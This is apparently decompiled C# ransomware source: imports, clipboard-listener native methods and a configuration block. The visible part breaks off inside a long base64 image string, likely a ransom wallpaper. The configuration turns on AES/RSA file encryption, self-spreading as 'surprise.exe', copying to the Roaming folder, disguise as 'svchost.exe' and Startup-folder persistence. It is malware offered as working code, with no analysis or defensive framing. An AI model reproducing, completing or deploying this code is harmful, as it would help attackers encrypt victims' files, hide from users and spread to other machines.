using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.ServiceProcess;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using Microsoft.Win32;

namespace ConsoleApplication7;

internal class Program
{
	public static class NativeMethods
	{
		public const int clp = 797;

		public static IntPtr intpreclp = new IntPtr(-3);

		[DllImport("user32.dll", SetLastError = true)]
		[return: MarshalAs(UnmanagedType.Bool)]
		public static extern bool AddClipboardFormatListener(IntPtr hwnd);

		[DllImport("user32.dll", SetLastError = true)]
		public static extern IntPtr SetParent(IntPtr hWndChild, IntPtr hWndNewParent);
	}

	private static readonly byte[] _salt = new byte[32];

	private static string userName = Environment.UserName;

	private static string userDir = "C:\\Users\\";

	public static string appMutexRun = "v45hchdrg72ns7m6jmy";

	public static bool encryptionAesRsa = true;

	public static string encryptedFileExtension = "";

	private static bool checkSpread = true;

	private static string spreadName = "surprise.exe";

	private static bool checkCopyRoaming = true;

	private static string processName = "svchost.exe";

	public static string appMutexRun2 = "oAnWieozQPsRK7Bj83r4";

	private static bool checkStartupFolder = true;

	private static bool checkSleep = false;

	private static int sleepTextbox = 10;

	private static string base64Image = "/9j/4AAQSkZJRgABAQAAAAAAAAD/2wBDAAgFBgcGBQgHBgcJCAgJDBMMDAsLDBgREg4THBgdHRsYGxofIywlHyEqIRobJjQnKi4vMTIxHiU2OjYwOiwwMTD/2wBDAQgJCQwKDBcMDBcwIBsgMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDD/wAARCAC0ATgDASIAAhEBAxEB/8QAHAAAAgIDAQEAAAAAAAAAAAAAAwQCBQABBgcI/8QAQRAAAQMDAgQEBAMHAwMDBQEAAQIDEQAEIRIxBRNBUQYiYXEUMoGRI0LBBxWhsdHh8DNSYiRywlOC8RYXNEOSY//EABoBAAMBAQEBAAAAAAAAAAAAAAABAgMEBQb/xAAwEQACAgICAQMCAwcFAAAAAAAAAQIRAyESMUEEE2EyUSJxoQUUQoGRsdEVQ1LB8P/aAAwDAQACEQMRAD8AcZbDKUy4ComdISdQM4j169adtkIZb+IbQQttMpSckKUCEkHOQZJHYUrrtnkpdZU44s//ALkrHL0xgpPUnof60dS1fDIuNYbKMI/DgrxAUT3EAD3J6V0nzpXr4egtiG1LWpQDSFiELVIgE9hilvHbQctlKS6X0ykB6IKyLdoFUesYq5tiyjTcFHMeagjVgExiEiNjJ+lI+JGy5wRC1ySQ3JIyTyiP/GhDTOq/a7bu3Pgng4anm/FM6SN0ktKg/Q5ryh1j4nxXeC5ulAfu9OpLL2pS09UzGRtIEb17P47KT4M4WtYWpCXGlq0bgctUn6b15JaK0eKOKPcnTyLFCEucopKtUEHYASCM7wn1rmnG0bepk1N19v8AByz9mXHTp/OrGO57Upc2Gm5KFAiB5vT+9daxZhb6/JKUIUtQjoAf1ilFWWi0ddkyVBEaZChmTP0x7GtuOy1lrRyK7NYaddVpiQnKoJM9vTrU+HWsvuodQVjkOEAIKilUYO4iO+fY11ttbNIsrtm6aVoAQVaPMdXmKSRjygnO+fekbCzaubt9dzo1OtulAU4QdQAIGIJmcjrH1rnb1LXRUc9p2ujl1Nw2VqM68AHcDHWkXU+VWOkR3q9ubcqdKBJ0+RPt0pN1hBdEo1oScpmCpPXNaeDqhMQvyTdunmNKz87RJQcZInMVHiDCmWLUO262iWyZU3o1+YkGZzggdP4TTnGUH94OyIIgEBYXskD5hANL3bYDFtCEgqQSpQWVFR1ESR0jaB2nrUJ9M2jK6ZWFNY2BrFEWmJrTaSVgDbqe461RrZINlyQj8okz271rzYgxGJppLejSE4/r71vUkqMtgnrBjNInkJqQTKwIEx9e1Q06VEU6pWtUaQAIgJ2FBUApR+/oKAUhvjFu4y42l1Fy2Q0AE3CQCIJED0wY269qrSNpq04oyLVxtKVqc1oCiVtlBGSIIk9v8ikVEYMdYpR6CL0RtmHn3Ut27anHFfKlIk7SYHpmhlPlJp3hyEuXbSXUFaCSClKSScHoINAdCTqKQADsAZj0mjzQ72aYVCSIkEz6ipLKjG3tUEwnA77x6VvWUJ7Sd/7Uwo0pCtQJG4x7Vi1nlqB6kE0VMcsZHoSf4VjqRylaYiJoCxZJITtgUzaIbcdhRCAQQSpJIAg5gde1BZQFJmNjRQktuagehkTFJgyfJTpRyyFqCvlElRE9qm4pOrmNApgAiRA9vbtUWblxhI5DqkSoE6VQScwfpn71B1alrM7TCfNOnO00LsnZs6m2nEEYUJEGQKFaLKbgK0JWYjSoSDj6UTnKDahrMgYHSIodsoqukkJRO8GQKbKXTsI3L1yltEJUtQAkwkGf4AUy61oStD8cxMQQrBHQzSyULLusKAKDJI3menejXzpcd5qnQ6tWCkp0lMDqNvselLyQ021QJlhKx53CgRggSJ7Ud3UbJlpa0lKCSClOU5xn16UG0uXGVBaQ3tHmTOKO8+m5UjQyhsknUEqISok4IB2jam6E+V7ErdK1XSAgeYqge9ZUspuRpBSQTHvJrKZo7PZeGLueDPix4sAxwwlSbO6eSENISDKGg5+ZUHIVBBRuRt0yVqabcZDYKiCStYylO2DO5O38KX4whzi1khriby1hpQU04hQJbUkEAiQZEEgggggkdapOB8VuvD/EGeGcUKBZJSoWjjq1J5rSASC4o+SSCUiCCCIgSDW3R4rSyq49l+/qYcZb5cwCtQUI1K6D2A/XvROOtFfh5vAB0NKITsDDwP8AKhpcLqQtKANY1ISMgJO2e3UH+tN8SXPBNCxnlJOMgjW9NUjA6bxe40jwBw59/TyGhbuOFQkBGnzEj2mvKPDKGhb8Quzy3lXy3SptQUlxGhSkpUtJmCZOBAwABg13X7VOJLtv2VcLtWWA65xFLVu2VJUUpPKKh8v5jpgdBudqoxa27TTDNshATbW5ASlYVpB1EqncqBkzn5s71zvs29a+KT/5JfoUaW5YcdUDlYQDG2CT6dq0m2U98NbqMggOaVDCSZJk+386fXbD4S2CSdTqpOcHaDHpW1p/6m5IKVhlvSNYiRpgDEZiftW9nPzW6+f8IqX2ipi/d5KQl5SUhYbnSZKiNXQbe9ZbcPQ7euoY1LDFuptOhYbKlkHMmOpyKuLRCE2yUPNtaUAPypyFRKoISIyInP8AalrJlu5uXNcS8l4rB3jGJ9c/asm7Toz9z6q8HMrsFN80qR5mUhJSRnWcQB3GftVdfcPGWoKCiGs7T+cz3/rXVqRCUOJJhS1v6V5EJPk/Uf8AxSF9bcppRdIbQ2iFOqUdIKiCokxOB2+m9U0dkMkjk+MsqN687ym29iEoa5aQIhMI6TEx1360txtlu1cZY0PNqQ3Gh15LpmZAGkCAZmO5q445+JxJ9rhrb6m0r863U6CkFMpgKJO0mSJAzE4pO64Muzdt1XYd5jrKXCVIKUznIEDAGJrBdI7oSSrkzmiytfzgpHQbGakwj8VI9Yq0fttzvGfT70syyOenHWrOhTtAvNqP4Z36VjaFlQMZScSJB9IotywGlkoKpUYEGot6kOwoKKomCqP40AnogymXCFABQyU/0oLo0rUEice43NOstLdcDhQQgnSFHae0/wA6g61EqwSBv0OaX5BySZLj8Lvypm7Vdtx5VFxSynJ8upQEnc7dar9PlE/SrjjFsi1fASi5RiFJuUBCwZIBgHaAM9TNIqQhSU6YMbicj6Uo7VocZWkS4OtLXFGC4uEgkatUacGDIzik1QGPcdqPY2yX7tppZVpUTOnJAAJOPpQF/wChuJjvRq2V/F/75MZ/0z5ATMSelYrShWeozO1TtCA0euZ9sZrFo5ihO22DmmO9g24ORnMJnvU30JKSZ80TtBoiWAhJCsdyTiaitB5GcFIIM5BHpTFe9AraNEk7HPtRW21LWAEBwwTpAnGZP0qNsgqYVA65A3Ip+2bdSpvmJKGVglHNBCVGOkbnaPpUvQpOhRtvQ2echcBUSBiQciagtxPnAQIUcBQyBOO1NPtvhtcNbuebSFSkg7H6mKReS4hRDiFIUN9Qg0JgnZBKwlfmGIgnY7YqVkSLlGggEmBO01vZO+4zNDt55ydMTMidvSmy+0NrTGtxRSV8zKRkEycz2/r6UBZ1OKWQJmTAgUVKxrTnIM5wZn/Nqi+orfW4qZODJmfWaBIClBMHp39aMvQWWyjcSVGes/pWN/6QTKYVn1BoyrZKLRtxa2/PJASuSRJnUAcdIoBtXsSU6VrlcmJ33NZWMIK3QgbnH1rKCtH0Cm9StIbSECAVK5aMkkCRJk9hS1421xThbnD7tbnwbnzJSuDMyCNxIIEYP8YqsZ49zG1trW2gKUFAgBsxmE77ZP2qytnGH7YRfstgpydaJGexWK6DwEnBlWHOJeGtPLQ3xWwWpTq9FutCkLJwygNkpSD8wxpkkYmupteJ8N4rwZ1qzvWH7hhsBxoGFI87ijIMHAUJIkDrFDbTw910H96NgATAcbknoJ1muf8AGdnZ8i3tuE2jz3E+Jl4MKQ+6EurUQlxSUI8qllKwknaEqKpxSf4TaPHI6a38f9lohCvENpd+IGbwucO4OhPD7XS4tOoqSyFJLZgAAlatW6ipOyUgVN9sN31w3BGljGhr5fKDBjbAyaMrgXjPgH7P30JNpc2LjjCjbulwvtkOfiOQvTlRiUFRHUEbVRL43xK2vi5f+H3y0pJDiUqWEaQklBUhOsgkdCSB3xWfKrF6rHJyXHev5likKN3bN8xcJShU7lOAowD60stxYYfMghxzSrGTuSarLzj90xxEG34RfNkNIWA8sleRBCSElIAn8xH0qDd3xl1Yt2uFstNrfUlJfPlA0wlZcCjO2UpT03q78mKxS05V0jo7bUWr8LQAUNBuE5yEnOffP9qUuLhix0fHgtRbKbabWhRUtZEkJSmSe/8AOKp0WniLiFjxYXV83bhxKQ8m3bSr8xJIISnSiOkkmd6Jw7w3YOXNw1eNKffKl6Ch0spSoggoSkT5TnHXqaz65MlYscOXKX9BZfG23r34bhDAvVrDKULUXEJdBjVphMQD8xUYxgE5qFvwa5vL4P8AG1t3/NK/wEqUgLClhCZJICQMkAbRJJNXLTrYUjls6LcKcUhoNwkJSmAIE7degpeWkOJLS0gpCD5iQCQCoz9Y/vNU1Zq8vFNY1WuwfErG0YvSxZWwTbynSlCMeYATEA7BRznqe9VtyxzuVobCHeXpUdRUVGTBgmRgCYx96vuKOBN6+UJbAA0hMYw2AT3zqJH9qhxZhKHbVCG1EONaRqVIOSOwjbb+tZx6SMYZGqvycW/baXyOXAnpk+lKMWwNynBgnGkSQfauifZPNmInMK2JjPekU23LuwExKTJJOB3rSjsjk0U9yzquUlEwSqMQesUq2yrmhCx5ikp9Qe9XuhCblTTraTplEEwAc9fSgN2XxV2lA0oU7MzgSamjaOTVC9lbxYJCUrn4lSJDkwdGAG++51fSkbmC44QISokgdhNdBYtuCwTDPlF2XVOKwgkNyRvPywf16VTXrCmnXG1iChRBA6ZOKmPbsqMrk7OqsLO24u0b19hSXrdIS2lYOkiCTjTk+Yg75E1zHHGm7V5+ytm4YbuVFBUkFUbQVRJ29sU0q54ihoOfvF1BLesq+IUSoESB6nfFKXpfWxbquSoqfBcClKlShqI1H3M+9cuLHKM3Jy0/H2MsMZRm5OVp9L7CNg0l6+ZZW3IWTAK9AJ0nr7x/KoXDZ/dupKUJZNwoJTAKk+UH59yIx2xPWm2Sq2dYfSEFSCTk9FAiOnrSygFWSWg23IcKgqDzIgQCdo7es966KfI7FLYkytTMECQTntU3HlrSAlvboKC+sIgdf5U1YMpvLltphq4UrlklDZClEgEkjG2JO+Aavo1ryDL2plKOUorkySqQR0EemaGtx1bWnlnAgHsO1GFmpbFu7bcxfOUpsiMlaQCYPaCPX70vcoU0+60rWjlqIKVHIIOx6T3pJ2NJA0puAmAlcTOAd6kr4kxq5mNpmoOOK+ULVHXzYmrJixafDHLLiy82vyoOpWtKRGI2k+v03pOl2NiSjdqSUqW7pnYqxUFNvq+Ykn1WKmpgoSnWrSVLKCCk+WCJn79KC+kIcWhJnSYmImnoaN8hf+5P1VW/h1/70f8A9ChpjSe9N8KaFxdpb5TjyiCUtoiVKAkDPTGaG6VhsX5aurqP/wCq3yf/APZH3P8ASi3qUpvH0IbWyhK1AIWZKBJwT3G1CUiIIoQiCUBW7gT7yanyU/8ArJ+gJ/StJlKZpjUlbCQpCZT1GCc9T/KiwbAJQhKiS6cGAQmsonJSbdxfMSChaU6D8ypBkj0EZ9xvWUWM7hrjTyWQ8rh3AmlIc5Zb+BbCwZySnfH6Vao8W8WteasO8KbDaQUlixtlFRMwEqKTJ77xXGtlD1q84WrgqDySVF8EJSomEwRJUcifqRTepb4uxa26wwEJK+cUKUiCVEhUCJ0qJjeKXKXlnnPHuztv/uN4iFsl1fFlozktsNJJkbCEjNV/CfEXGXeL/vl/i138TfICFONuKKi3rJjSIiAANKYGOpNcTzlvOJbJJZQZwYzHerWwuxzbdDq4ZSpI3ICUyJyNsTtWl6G4uEaTPQ3+MXly2+29xO+dh9oJDt0ohI5oElJPscz9IrS7ppPELsLO1oVBZdggwqQDPUmeswe9ckq8QtniCg44u4S6gsrSCRpkgeY+4ie9WCbm2TxC7cRzZctQsKU3IHlhQ0naSQAr8sbZmsdnlyxSe22Wy7lab25POcKwlYKyZKhsZ9xvQ0rJTa/iEDmFQEAhORn19Z/WqH4x/UpwuLlzylU/N3E0VN0/zENyoLaV5UxlKp7e9dZt7bL625jvD75egOFZkkqjSoSQYAyckhO2KYbB/exbRoRrJJ5KCsA6QZMnCTuY26VT8OunvgL4JGsFCj0kKjefb7/SnFuXSL1tbrrgJa8pde5x5gG0oMj0BwJzNc91KSs5ZRam9g9biWYIEhp0eXeSYI9+1YvmIddZSglWpweQyVeUJ7fb39KU5y1NgFcJKCIndM5H3reu4edCErla1kSFgEmROcb47Vu1XRvxpMfvNL19eLcZSh4oSuVOKUpIhIIGACTiZ+mKTU8FfDrQXtRbkgoAggmAmCZG+T+lM3Jurl/iELWhJt0pEPJbEwTBTEqTgkAZyO9VfFlp+Jb+GcQErbBAS0pASYiMgTsNoH1zXPCW0jPGuTo2t5PxJQtw6tRSklO+/vVZqJuRoWdUk5EkntFAuXlqc+cbTMUu2tS3Uo1gK1QCO81qd0ceg3JKb1LaXCTzcq3KjnNMW5/HtFlrkrCFK1IkqeIKswQRMjTjGO9LWzL17eNWdq2u4uHjCGWk6lq3wE/571YcV4BxO15KeJvcN4au3ASGrniaFO7nHLQVkdeg3qWnaL9tyVIbt7ZjUxywnWX+U66EytRlc4JPlIgbAHaJFUXEG9bqy5OoyVTvPWrXh/D3bltSG3FuoSZUptJCYzmVAepHv61ascDaS4A8QPLJJGwrTHhltnBL1WPA3btlXeKv2FtrF06txdqUlSENrSVBRgah+WPNO+YxNVlxw/iDvD7Np3m8hpJ0JU2AAZOAeojqa7/92W1s6lpsNKAaCQtTIIT5jmB1nrWLY5llbtuLQMQBy4KRHU9fSlj9Mo/Jx/6lx+lHnSeHrZUhzSVmYCQJJ3xHpVfxVTbFmkIQAoqMmcgDp/n6V3N4y2iCnVAVHkME4PWua49wNxzghu2/OWVkrHUoMSe+DB9j6Vc8bieh6b1KyTXJ9nDrJWomsbVoUD/hoy2ihW1BUKwaPfTT0WqG2HWrYctZd5iisJQSVIgEDfpCto3maTu9PPc5B/Dk6CUwSmTGM/rU7F5SVJCCQpJxmJnBHscj2NGvYdu33NCWwpxR0pghOTiRAgelSlshadFYfejWrYcd0KUU4MQJk9B032rRR5qskpacXbJhLuloqKGUhhQhM5UQQSIOcz9aG6KvRVKQpPzYMwQdwfah00tTa1yErErJJUuZH239aAsDWoJMgHB70yjSaYsuV8SgPNqWicpAkn6AilaZtNHNQXFaUgySATPp9dqBMJAauirS4GUORKkQcHAid/Sfr1qfEX0XN2pxvXpISJXJJOkAnc7+5raygtvctxuVvSlGkyRJgztHvS77i1vLKwgKmCEpAAPsMUlsVXsi2Pw5prU87bWzCWFfMoNlCCS6okT7kYGKST8tMjmJQ05rgSSmFyRnJicfwpsGT0ITaPlekOBxCUgmFD5pxO2BOD02msqBWrlrGlMLIJUUgkGTsdxv9aylQh99DvNeddfaD6HTML8xVqyR6dZ9KM+7r5tui5beSpDcvPKIKSlJUQn0mUifTaZpX8P4dTYa/E1SHdZwOo0/rRbZtHKd1tpWrT5VKd0aTBzHX+3rRVrZl8s00uGkgYAkxTds9L7A+eVpGkCSRORHrn70jp8tGaEck8sp0uDU7pKpyI8pwY7detW+iZJNF2lx1TN2GoCXXkBREy0QshIMYEyY3+U7U4+/cLvLgraVqRbpSqAokBIgKkknIE+32rnfjVIU6nzLQ46FL8ukqhRj/t67fpTjfFVc98lEhxotxsUiCAZiYAOe/WsuLW0jllifhDTd1LKQo7Kx22oq3/x5yDqBjY9OtUfOKUjSes0X4lWpJG+K6LKeM6nhb7v7r4qE4b0EqOZnSYGMR1JNEsL24tb54uOrYWWdWpSy2Z0p056jaO+K5n4jVaXJkBRUiAFQCPNIic9P8NNJXzHw3bBYVyxKtHzrOwIPyjMT2E1ztbl8nM8Kt35LFm81JgkylK8xknfv1qfPDriWuYNKzBKjAAUkZJziqHnhKvN/uz1x7Vibko9Rgn+M10Xo19rR1PF3HHeKXrjyHVrQ2lxWlswkeSRnIAn+2ZpTjL5Q5atPOB55DMLIdKyDON8gxGKrStDqbxx51AUhA0onUVH3noIoHEn3XVNG4WlZSiE6dIgSZHlA/jWEbtfBGPF+JJ+AS3Cp0BGTMADc10HhvhNlZ8QRdeLNSLRDfNTasvDmOq/KFlJJbSc9icYAM1yuv8RIG5MCNye0VYqZuGuFvqW0pCCEgEkYM9q1R0v8Ok6O84h41Nv4e4nZcF4Vw7h1jcW6mh8I1odSDgkrnJO0+tQ8O2PBbItkMWqVwDKkifWvMG7t5tl1AWSlSCCCfevSuB3Lb1iwlyFpWiCDt0x/StMXZ5n7SjNY0lJ1+Z1fG12q+G260gBrmaZSI6f2NUzrDaHGg2swGwJ2J+9McePL4E1oVoSm5QB6eVWKrX1nTbGd20k9677vs+Zwwlxu/LG7JzlcQcDqwZTIUVbnGf6imWbph1u3aK8pBOkGVTG0bRWuGtIddSVtpwMSZNRuWGEKaKAAdRUevTeKji07J5RcnF9iq7Bhd6pZOthKjhWdW8Yn2qvvwm21cttlaOaSCkEpUCCCkf8AH09fWrbhKw5cgrhaACYidRjaKhxUIPN1BJ1OlUjE98Upxtpm+PK4z4s8m49w34R9RaBVbrMtqPQf7T6jb1+tVJZCWlOEZKoAO22TXp97at8sFIHm3ByD6ERXC+Jw2OJXLbDaUIS6QAkAADbYbTBP1rknDifX+i9X734WihyFSMUy05rTB+Yb+tBKaxsEKBHcVlR6bDrTtFNKe5YYclmQyps8tSlKjTHmBONzt60CNUdB60RkhDyfwwRpgiZGRk/59+tTIlsXSgFpn8M5cIJCfmyMTOf71B5uHHJGghRGkiCN+npTGoBtI5YhLhOD67d+n+RWOw46tcRqUTA2GdqEOxHRR7JsrfSPMCdiOm+fbvTHKTWkt/iJMwARmJjO8U2hc7NXdwtfMZZLvJW6VcsqkEyYMd4MUC4QoPELZ5BAAKIIjG8HOd/rTimU6S6per8QEjCRBJzIOJ/zagXITz1QABAwlesfekvgaYBIA6TTgRpbtl3KlBhZUAEqjTBycggCe00tOnFTZCmlsOtn8QqlOsCAQrG/T3oYB1IQbB5bSELRzUgKUFFxGFdRCYPXrgbVlLqQpSVrOnCoVBEyZ6dqykgGkpUhwoSStOoBRScKMmMfeKOvUlbugLbBAJQTuOu0Y7ULXzFLJEqUqdRyTJ70VtA5awsZgFOMg5qzFshoOmituqQlKD8oWFjJwQaxPYmoLSTHrtTa+4uzSzqS6vWqOYDCTAVkmSe/atpW4p1xba1EcuFFWTEZG/0HtQVp3ECZGevWpeXOBEY7TFTQ6oxJNTbXQpqSfmFWKhpJSpp1ZCjAAEGAN8xW/iXELUVuOyUgeVzMxie4AxS8qDagJ+3SoqWSonuIPtU1ZNE0vd6Iyh+5Xy7Zlx1ZyEoTJj2pQ1rUaorjfRbN2F6pSg4gW5EAh9zllX3inWeA3K2+YtxsJjOhYXP1BNU9hxjiVgoGzvrhiNgl0x9s0854n4w8k865bcEeYqYbmO8gCpZlKE/4WhywaZsb3WvWslOgHTJSSRsI3O3/AM1dcXeuGeEsOW1qyw0rUhTbaA6pwEESowYHSDGTPrXJfvV9SgVoRI/MglJ/Wn2fElwlhbSpIcEKCm0rKvrIz61UXSMZ4pSal20Ud2jkuLSnIA+aZx79+9GtPEnELdtDTbqUJQIBDYJ+5FY/eq54DbRgpkpiQoZk5+1acQh5sHlW6JGChEkjv0qU2no66UklNWdt4H46m9unLrxHxG+ct7ZGlCWkoUQVSCRqICcdQCc9K6d+58HvOSni3FLMgAf9QwhYjphJmK8ibDLCCCFLWowJVAB7wI23qyYu2mH0FoITiJCcn61tGbPNzekhbaiq/I9Xb/dTKOZw/jIvYHlSLNxE/U4FVfEHXXXkaR5djH61QWHEwpOhTm+DJqxbvdKZkQcCc10xla7PAy4HCfJRotLJvQqUlUkyAMRUbxSuWdR2V16UtbX6FpBSTrG8jA9ZpO5vStKtIK87ASd60bRzxwzc7ZK3Qbm+t2lLTCnADrVAA3JntE151xZJXcuEwVFRJggiZr0BlXDbRTb/ABLiTaXkOlPwzcmIMELVEQZII2wZNVnjTg/BLT4ey4Ir/rHX189y4d8rSQAQArACRMzme5xOGRXGz3fQyWOfFp7+Na72cApqIqbKVCdAJPpTF6y20+63bu89pCtKXQgpCx3g7A9Jqdsz+GpfqBXKe/y0A0K0yqJmDBmsZK0K8pAJGmY6RR1swpRBxIG+Nqhoj+1JoVgFau+6pPqe9b0lSvrU0pGobxREhNJKhuQNKScUTQUx/OiJKe1E1jGKomxRSdKSCTBIkd6XdjV5AYjqZzTyoKpg5M/xoDqAVHTUlRYiZqaXTpaGgHlknzZBzsfSiKaNTbaOPQ0UackaSscgoBypWoiNzBjP1M/2rKKlB0kdyCaylQuSJtpJj7UVPlUc9aG2Qma2XEblSfvVmLD5oS/moja06QQQR71pRSvIIPtQLoCpBPv61EpKY7UydPLAJANQ/D0/NQNMElO9aonl7/wrZA6fzoA0mdJFCVie1F0/7aitPlNAIHNQUrzVLUKGT5qRokzaaLqIg9h/goKalr8tAMkpXmIHTY+nSopcIznGajPm/h9KxWtCk6wUFSdQnEpP6GkFB2VxKl/MvJ9B0FYklC9H5TlPp3FJqWUzWi4oojrOPQ96Y+I2lyXC50T5U/qanrlXrS7cFsegiBUvljT3oE0WDFy40qZNWbfE1JbSFrAzAJPWqNlajP8AKorWSogmQDimpNHNPBGb2jr2X06da722t5iAtyTv/tTP6VK4d4Ui4bbu+LO3Taila026FNt/MJSScxEyQOkDea4nWT1NEU4oxqzAitPc+DD9z4u7/sd74r8ScNvOKt3NrY2qLW2CUNIaXCnEpJIKhGAMjT2V3Fctxrih4l8KFgqWw2UKcMSqVEjA2ABCQOkVWpOpOaIlG22ep2FJycjTFgjiS+C1vODFPhThvFhrK7y4faUDiQjSAU+gnfvPaqpKCE10nGGH7Wx4RZOlQQ3Z8xtB/KXCVkx3Oofb0qgbbKoRtqxPYRk1PkvHPkr8WyMfhpxuSfpUUgZn2p9loZEY6DsOgoybOY0iih80isS0B0rOX6VaK4ev8ok0P4Nad0UUHuIQ0VtKaa+HV2NZySmih8xRKD2rSmZ/pTyWT2rZZooXMrksnV5hRFM7U1yvSt6NsUUDmJcmsp9LPm6VlFBzKm2KUuyeiSU9tXQ1fcMvgiCNWo7kotyfuoGqJNus0Zu3V+aBUOLZWRRl2Wh5LvFri84lDjLJCiykoCnj+VHkgQY8xH8zROK3KeJMw67bG8YQHEuMp0pcQRJbOB5kTA+1Vybdenc1JVsTBVP1o4sz4q076El1CKfXZ1pNqE1dGvNCNbTNPJswaKm107iihOaK7TUFDpVmq2/2xUPhhS4sXNFSsEfLQ9KlVcG1HahfC+bajiy1kRXJbVW+X96tfhdXbtitpst6OLH7qKnlkb/wrWhSlHUSSB1MmOn9KtGLXnK5kHRsn19ay7tQ2nmR5k5gmNQ6ijiCyK6KhTZ+1YlvUmE1ZfDh9Q5YltJkqH5j0H060RNmrVhAA33zRxG8iRWpaKMxjr6etHSye1WTdrPzIwai3bFCiyRmJSe47fSnxIeRMTUweWdG4E0nqq+SwB8wxVM+0EPuITMJVA9ulJqh453Ydu3QW0nuOpqDaEO6sBCunb1pqwSg2yQveYxvvQOXynyifzYPp3oFy2yDds4rKYj1ptlrRrPz6UwAdp/tvR4LbisE8yCkD/dTdsgITy4n+ZPU00jOUtbCXN0riTrVwtY8jaG8iDCUgRA9senrWWVmdJWUYXlIOSE9Pv8A0ojNsealuRpXkjrHUfWrS3aUqCZz6QParS3ZzuaiuMehVLCPzATR02w3SKeTbJUnvHaisoRsd/WqoxcxBLMUNxkr+UA1bKZTq2+1bU0hKZ0expk8yiVarG6IoC7b0roFNDEigOsjVMH7VNFLIyiUwU9Kipsp3irZbI9ftSzrPlxt3oaNFOyuW2aEpB/+adW0dR9M0FSfQf561BakL+bb9KymNOrYiI6/1rKVj5CDFs49OgyBuQMA9pmmk8PUUqIclKTEpIKSf+7bHWJo54lr0BLKFuExCtKkx0Ab06QP41Fdy+8lLbzyikHDYVgf0qVyY3KTB/DNpnzrWekHFZ8Okxgx700yyFwZ1AGSE7D1mrBvh6VN8151LbIAJKfOqCcQmRn3q3JR7M5ZFHtlP8MjSNQP3oqeHp3VjuNUn7VctoClaLG3cHl/1FZWod52SPWsUwEqOv8AEWTJCV+UepMZNNW/gzeZ3oqU2I0gp5g6TP61irUpwl0ztlMzVxoC9159ozWvh0FIGhS5MdyT9M1XEXuvyVPwb5SY5ZHtFQ+Cu1JKxbpKZidcCemYrp/g2bNKV3Ol5zUIYCx5toCj0H8fvST+txRLjpCEzCeiR39+lLvolZ3Loo+TcbJZT2y5k/SoqtbtLpBQzjIQVyRVjy7ZajpClk5KlYERtECiM2yNR0NSesCf4VSjZr7lCdu2lcjAdB8yCmD/ADzUL63U4s2jOkLCZeVsUp6J9z19PerdVkl+AtpMp2UVgaTmDMzWJ4ULJtR/eVidZU4U81S1Ek5k6d+1DXglZE3ZSJtnsBanOWnADY0ADt1P8aIbNtLa+ShDS4w4RJT653pt95SVYcaWNgUmf4UFTmwI19yTI+1FItSkVzDfIWq1jmAnU2Qcx1H03+tbW4whXnJwYITCsztIO9H4gEOW3nQEFB1J1CQT2jsdjUm7llTKSgJQkiSnYD0ip6NOV7IsoeMeVDSZwXMqA6eUf1qb9lKAtu4K3UHUgqwmeojsdjWm7xJ1fhnsM4qalBxvWdKIOIEkY71WqMXKSdhuG8OuOKgK4fbPXSlYLbSNSknqI9KqfFfCb3hV0yq9srm0U8iQl9hTcwckaoncTFMw3qJSCVdFbEes0lxZSnI59y88oDy6llcb4gnH0/Sol0b4rUrst/AHh258SruLGwesBcpOpLNw6pClJjKhCTgYB2qs8RWf7u4o+wjSt5hwsLCTIK0HSYnMSDvHtQeCXLlvejku8kuJ0aontineM2lw7dIcWsOXFypTitIgnuqIiprRbfGezobTwj+8LPit5wviPPa4cj/ppZ0m9WkanQnzGEjIBzJHSIp1nwbeHhY4swtDnDlMC6+JcbLSEt6dRMknI2ikuAeMPFfALFFnw2/cbtW06W2VtIcS2P8AjIMde+/WjcL4vwqGuHcT4e/8Cm9+JlwB91FuCFhhAOkBJckqKQJBjrVKyZcZeSz4V+z3xLfcHZvWeG//AJSQ+2FPISpIPygpMRjJHrQ+H+GuM3tt8VbcLunEalNL0pBKFoUUrSRMgggj/Jr0RX7UrR5SGrAtjVlT94hTTbfpCdSifsPWtcG8UcP4T4iedf4vY3NlxYF1027amwxcIAE6CSYWmMz8yfWi5Il48cmkmzh/3BxJqQ9YXbcjdTKgB9YoP7rdRktqH/cI/SvTXf2ncMQ8oJtX3GsQsKSCf/bMj60ZH7TOBnCmbse7aT/5U1KX2M/ax+J/oeWJY80YBG/myKJ8GcDEnr0PpXq7fjTwjdxzXm0k9HbZX84ijov/AAZdY5vCyT/uSlP86Tm/sJ+lUvpmjyQ2pSmAhRSk+ZM5T3I70k7ZqDetGUknc5GcSP1r2lXC/CNxkN8OOnEocAj7GtHwb4buka27b5shTb6j+sVKnXZK9HkT1JM8JfYdQo6kEEbg0tBT8wP1ECvcn/2acEdmHLxv2dn+YNV7/wCymyWmGOJ3KM/mQhX6Cq5xL/dsq8Hiy9KlQR5owFGB95oKrIhUPtLbT/6iUkj0zIH8q9duf2QOqP4PGm4GwVbEEfUKpRf7KePMJWLPitqQrdOpxAUI6gTUS30xPDlX0o8pf4etLihbuJfAOYEKA6SD+k1ld5c/sp8TpV5GrR0JMDRcRj6gVlFfJSjlWq/Q8tbKUaRoISswNKJJPb1p5lrQlznEW4RENKaUVrPbAx9SPais8X+DdDljbW1qk/6aCjmuqPcKUkkx9B9qK/c3PMS5xVzcSEIcS4vfqAox6zmpUne9f3CTlfRuwS64VIR8Qtt0aU27dv5lCcnUAMdCRvNPLWlCZu0OAJH4TCflHoo4Ij0/tVUrjBUl0A8tpS5OhISpQ6BRTuB0G1L/ABmtRKVkz1mrVvbM3jlJ7Ll29U+kIhttIM6UggT33yahz0pjURE4gTJqtTdbhIn16UdLnJhxcFZMlsggkRvtirtRWgcFHRYN61pOkGBlSogJE9/tU+epCiGchPlCttWdwCMUgp9bq0/hpAGUomIx7HNGS4bdg8/CnPMEJCTAgR12o5fczcfuONo1JUVIVpSmdo1HtJrHUpxpaCEkSBt9SJNU9zfvvLlZgadMJECIjYUFtzlqJQcnsf700xrE+2XCpwAB2+vvU27kMq8oVrPULiO4j16VSKfc1EpJhQgicgVHW6qe2ACafIt4r7L13jNyiQXFLBEEqCVE/UzSNzfoegrAPYBEfwqv1uhRBKQDH5JI+s1mVJJmNj3Ipcio40hlN0hlXMSy3/7tvajJ4q+tvQ63anG/KG094pBa0JUPIATse/cxQVOIVsFHE496Vl8ExpbybhXlCUE/lGMe00u6yUqB5aYO85PvtQ5OoeQ7/mx/GiaVNYMYE7zSKqiGSkaRGxm